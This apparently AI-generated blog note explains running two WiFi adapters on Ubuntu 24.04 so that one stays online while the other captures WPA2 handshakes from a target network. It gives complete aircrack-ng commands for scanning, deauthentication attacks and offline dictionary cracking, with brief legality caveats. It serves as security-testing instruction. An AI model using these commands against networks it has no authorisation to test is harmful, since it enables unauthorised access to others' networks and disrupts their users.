---
audio: false
generated: true
image: false
lang: en
layout: post
model: x-ai/grok-4-fast
title: Dual WiFi Adapters for Security Testing
translated: false
type: note
---

Yes, Ubuntu 24.04 can connect to one WiFi network using a known password (for internet access) while simultaneously attempting to "hack" (e.g., crack or test) the password of another WiFi network, but this requires specific hardware and careful configuration to avoid conflicts. This setup is common for ethical penetration testing or security auditing on your own networks—note that unauthorized access is illegal.

### Key Requirements

- **Two WiFi adapters**: You need at least two separate wireless interfaces (e.g., built-in laptop WiFi as `wlan0` for connection, and a USB WiFi adapter as `wlan1` for monitoring). A single adapter can't be connected (managed mode) and in monitor mode at the same time.
  - Recommended adapters for monitor mode: Intel (e.g., AX200/AX210), Atheros, or compatible Realtek chipsets. Check compatibility with `iw list` (look for "monitor" under supported interface modes).
- **Tools**: Install `aircrack-ng` suite for scanning, capturing handshakes, and cracking:

  ```
  sudo apt update && sudo apt install aircrack-ng
  ```

- **Ubuntu 24.04 specifics**: No major changes from previous versions—NetworkManager handles connections, but monitor mode tools can interfere if not managed properly. Kernel 6.8+ supports modern adapters well.

### How It Works: Step-by-Step Setup

1. **Connect to the Known WiFi (Managed Mode)**:
   - Use NetworkManager (GUI or CLI) to connect normally:

     ```
     nmcli device wifi connect "YourKnownSSID" password "knownpassword"
     ```

   - Verify: `nmcli connection show --active`. This keeps your internet active on the first interface (e.g., `wlan0`).

2. **Set Up the Second Adapter for Monitoring (Without Disrupting the First)**:
   - Identify interfaces: `iw dev` (e.g., `wlan1` is your USB adapter).
   - Avoid `airmon-ng` (from aircrack-ng), as it often kills NetworkManager and disrupts connections. Instead, use manual `iw` commands:

     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type monitor
     sudo ip link set wlan1 up
     ```

   - Verify: `iw dev` (should show `type monitor` for `wlan1`).

3. **Scan and Capture for Password Cracking**:
   - Scan networks: `sudo airodump-ng wlan1` (lists SSIDs, BSSIDs, channels; press Ctrl+C to stop).
   - Target a specific network (e.g., BSSID `AA:BB:CC:DD:EE:FF` on channel 6):

     ```
     sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan1
     ```

     This captures packets to `capture-01.cap`. For WPA2 cracking, wait for a 4-way handshake (or force one ethically with deauth: `sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan1`).
   - Crack offline: `sudo aircrack-ng -w /path/to/wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap`.

4. **Restore Normal Operation**:
   - Stop monitoring:

     ```
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type managed
     sudo ip link set wlan1 up
     ```

   - Reconnect if needed: Restart NetworkManager (`sudo systemctl restart NetworkManager`) or use `nmcli`.

### Potential Issues and Fixes

- **Connection Drops**: If the first WiFi disconnects (rare with manual method), renew DHCP: `sudo dhclient -r wlan0 && sudo dhclient wlan0`.
- **Interference**: Kill conflicting processes only on the monitor interface: `sudo airmon-ng check kill` (but this affects all—use cautiously).
- **USB Adapter Stability**: Some cheap adapters drop in monitor mode; test with `iwconfig` or `iw dev`.
- **Wired Alternative**: If no second WiFi, use Ethernet for internet and monitor on the single WiFi adapter (easier, as killing NetworkManager won't affect wired).

This setup works reliably on Ubuntu 24.04 for testing purposes. Always get permission before testing networks.

### References

- [How to enable WiFi while using two wireless cards one in monitor mode](https://security.stackexchange.com/questions/121215/how-to-enable-wifi-while-using-two-wireless-cards-one-in-monitor-mode-and-other)
- [Wireless Packet Capture using Ubuntu 24 LTS](https://www.reddit.com/r/RGNets/comments/1l4672v/wireless_packet_capture_using_ubuntu_24_lts/)
- [Aircrack-ng Newbie Guide](https://www.aircrack-ng.org/doku.php?id=newbie_guide)
